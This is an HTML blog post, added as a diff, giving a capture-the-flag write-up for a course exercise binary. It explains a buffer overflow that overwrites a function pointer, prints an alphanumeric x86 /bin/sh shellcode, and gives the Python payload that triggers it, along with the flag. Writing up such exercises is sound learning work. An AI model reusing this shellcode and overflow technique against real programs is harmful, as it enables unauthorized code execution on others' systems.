@@ -1,0 +1,215 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Zespre's Blog, Sometimes, we generate bugs">
+
+
+        <title>nphw1 Writeup // Zespre's Blog // Sometimes, we generate bugs</title>
+
+
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/theme/css/pure.css">
+    <link rel="stylesheet" href="/theme/css/pygments.css">
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
+    <script>
+        $(document).ready(function(){
+            $(".content").fitVids();
+        });
+    </script>
+</head>
+
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar sidebar-article pure-u">
+        <header class="header-article">
+            <hgroup>
+                <a href="/author/zespre-schmidt.html" title="See posts by Zespre Schmidt">
+                        <img class="avatar" alt="Zespre Schmidt" src="http://www.gravatar.com/avatar/93724215aa2d5a9f23d47bda8208073b">
+                </a>
+                <h2 class="article-info">Zespre Schmidt</h2>
+                <small class="about-author">Bug generator</small>
+                <h5>Published</h5>
+                <p>Wed 12 November 2014</p>
+                <a href="/">&larr;Home</a>
+            </hgroup>
+        </header>
+    </div>
+    <div class="pure-u">
+        <div class="content">
+            <section class="post">
+                <header class="post-header">
+                    <h1>nphw1 Writeup</h1>
+                        <p class="post-meta">
+                            // under                                 <a class="post-category" href="/tag/secprog/">secprog</a>
+                                <a class="post-category" href="/tag/ctf/">ctf</a>
+                                <a class="post-category" href="/tag/writeup/">writeup</a>
+                        </p>
+                </header>
+            </section>
+            <div class="section" id="intelligence-gathering">
+<h2>Intelligence Gathering</h2>
+<ul class="simple">
+<li>There is a vulnerability in piece of code which contains <tt class="docutils literal">strtok()</tt></li>
+<li>There is a <tt class="docutils literal">call eax</tt> in the binary</li>
+<li>Because it is an interactive shell program, bad characters are 0x00, 0x0a,
+0x2f (filter out by specific function in the program)</li>
+</ul>
+</div>
+<div class="section" id="de-complie-the-binary">
+<h2>De-complie the binary</h2>
+<p>It is hard to debug using gdb. A possible method is to use gdbserver to do
+remote debugging. But sadly, I do not have time to learn how to use it. Maybe
+next time...</p>
+<p>So I turned up using IDA Pro to do the static analysis. By decompilation,
+bunch of functions showed up:</p>
+<div class="highlight"><pre>...
+frame_dummy
+passCmdline
+splitCmdline
+parseArgv
+printEnv
+setEnv
+getResult
+sendResult
+closePipes
+exeCmd
+nextLine
+main
+passPipe
+addPipe
+delPipe
+...
+</pre></div>
+<p>By doing some observation, I picked up three interesting functions for deeper
+inspection: <tt class="docutils literal">main</tt>, <tt class="docutils literal">passCmdline</tt>, <tt class="docutils literal">splitCmdline</tt>, <tt class="docutils literal">exeCmd</tt>.</p>
+<p>+===================+=======================================+
+| Offset of cmdline | Meaning                               |
++===================+=======================================+
+| 0                 | pointer of whole command line         |
++-------------------+---------------------------------------+
+| 1 - 10000         | pointer of each word                  |
++-------------------+---------------------------------------+
+| 10001             | number of words in whole command line |
++-------------------+---------------------------------------+
+| 10002 - 11001     | single command, seperated by '|'      |
++-------------------+---------------------------------------+
+| 11002             | argc                                  |
++-------------------+---------------------------------------+
+| 11003             | not important                         |
++-------------------+---------------------------------------+
+| 11004             | stdout                                |
++-------------------+---------------------------------------+
+| 11005             | pointer of function printEnv()        |
++-------------------+---------------------------------------+
+| 11006             | pointer of string &quot;printenv&quot;          |
++-------------------+---------------------------------------+
+| 11007             | pointer of function setEnv()          |
++-------------------+---------------------------------------+</p>
+<p>Since the program uses function pointer to call printEnv(), we can simply put
+our shellcode to replace the original printEnv() with the aid of buffer
+overflow.</p>
+<p>According to the table above, stack overflow will happen when we type more than
+1000 words in one single command (commands are seperated by '|'). To overwrite
+index 11005 with our shellcode, we need to stuff 1003 words in total.</p>
+<p>The 1005th word will overwrite the pointer of the string &quot;printenv&quot;, which used
+to compared to the very first word. When they are equal, the program will run
+into printEnv(). So our job is to ensure they will be the same, otherwise it
+won't call our shellcode.</p>
+</div>
+<div class="section" id="shellcode">
+<h2>Shellcode</h2>
+<p>The shellcode for execute <tt class="docutils literal">/bin/sh</tt> is showed following, grab from the
+Internet. See the references at the end of this article for more information.</p>
+<div class="highlight"><pre>PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx
+</pre></div>
+</div>
+<div class="section" id="exploitation">
+<h2>Exploitation</h2>
+<dl class="docutils">
+<dt>The first word should be the same as the last word, and the shellcode should be</dt>
+<dd>1004th word. That's all!</dd>
+</dl>
+<div class="highlight"><pre><span class="n">payload</span> <span class="o">=</span> <span class="s">&#39;a &#39;</span> <span class="o">*</span> <span class="mi">1003</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;PYj0X40PPPPQPaJRX4Dj0YIIIII0DN0RX502A05r9sOPTY01A01RX500D05cFZBPTY01SX540D05ZFXbPTYA01A01SX50A005XnRYPSX5AA005nnCXPSX5AA005plbXPTYA01Tx &#39;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">&#39;a&#39;</span>
+</pre></div>
+<p>Don't forget to append a new line character to fire our payload!</p>
+</div>
+<div class="section" id="flag">
+<h2>Flag</h2>
+<p>The flag is <tt class="docutils literal">SECPROG{N3tw0rk_Pr0gr4mm1ng_h0m3w0rk_1s_e4s1er}</tt></p>
+</div>
+<div class="section" id="references">
+<h2>References</h2>
+<ul class="simple">
+<li><a class="reference external" href="http://0xcd80.wordpress.com/2011/04/16/linux-x86-shellcoding-101/">Linux x86 Shellcoding 101 – Objective: Topics introduction and exit(69) shellcode</a></li>
+<li><a class="reference external" href="http://inaz2.hatenablog.com/entry/2014/07/11/004655">x86 alphanumeric shellcodeを書いてみる</a></li>
+</ul>
+</div>
+
+            <div class="hr"></div>
+            <a href="#" class="go-top">Go Top</a>
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = "zespre"; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div><footer class="footer">
+    <p>&copy; Zespre's Blog &ndash;
+        Built with <a href="https://github.com/PurePelicanTheme/pure">Pure Theme</a>
+        for <a href="http://blog.getpelican.com/">Pelican</a>
+    </p>
+</footer>        </div>
+    </div>
+</div>
+    <script>
+        var $top = $('.go-top');
+
+        // Show or hide the sticky footer button
+        $(window).scroll(function() {
+            if ($(this).scrollTop() > 200) {
+                $top.fadeIn(200);
+            } else {
+                $top.fadeOut(200);
+            }
+        });
+
+        // Animate the scroll to top
+        $top.click(function(event) {
+            event.preventDefault();
+            $('html, body').animate({scrollTop: 0}, 300);
+        })
+
+        // Makes sure that the href="#" attached to the <a> elements
+        // don't scroll you back up the page.
+        $('body').on('click', 'a[href="#"]', function(event) {
+            event.preventDefault();
+        });
+    </script>
+    <script type="text/javascript">
+        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+        document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+    <script type="text/javascript">
+        try {
+            var pageTracker = _gat._getTracker("UA-56544554-1");
+            pageTracker._trackPageview();
+            } catch(err) {}
+    </script>
+</body>
+</html>
